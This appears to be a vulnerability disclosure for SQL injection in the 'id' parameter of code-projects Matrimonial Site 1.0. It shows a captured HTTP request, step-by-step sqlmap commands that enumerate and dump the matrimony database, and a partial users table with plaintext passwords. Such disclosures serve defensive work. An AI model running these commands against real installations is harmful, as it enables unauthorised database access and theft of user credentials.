# tesc
Vulnerability Report: SQL Injection in code-projects Matrimonial Site 1.0
## Affected Component
- **File**: `/view_profile.php?id=1`
- **Vulnerability**: SQL Injection via the `id` parameter.

---

## Captured HTTP Request
```http
GET /view_profile.php?id=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not?A_Brand";v="99", "Chromium";v="130"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Accept-Language: zh-CN,zh;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/search-id.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=pvm9s24kls26lgqj0730spgclj
Connection: keep-alive
````
## Exploitation Details with Sqlmap Tool
Using sqlmap tool:
1. Enumerate Databases:
python sqlmap.py -r 1 -p id --batch --dbs
2. Select Target Database (matrimony):
python sqlmap.py -r 1 -p id --batch -D matrimony
3. List Tables in matrimony Database:
python sqlmap.py -r 1 -p id --batch -D matrimony -tables
4. Dump Data from users Table:
python sqlmap.py -r 1 -p id --batch -D matrimony -T users --dump
---
This will lead to leakage of user information.
Database: matrimony
Table: users
[12 entries]
+----+---------------------------+---------+---------------------------+----------------------+-----------+-------------+-------------+
| id | email                     | gender  | password                  | username             | userlevel | dateofbirth | profilestat |
+----+---------------------------+---------+---------------------------+----------------------+-----------+-------------+-------------+
| 1  | admin@nowhere.com         | male    | admin                     | admin                | 1         | 2016-02-17  | 0           |
| 6  | test@test.com             | femal   | test                      | test                 | 0         | 2016-02-11  | 0           |
| 7  | jdshfkjsh@nowhere.com     | male    | shobi                     | shobi                | 0         | 0000-00-00  | 0           |
| 8  | E-Mail                    | <blank> | <blank>                   | Name                 | 0         | 0000-00-00  | 0           |
| 9  | raju@nowhere.com          | male    | raju                      | Raju                 | 0         | 0000-00-00  | 0           |
......
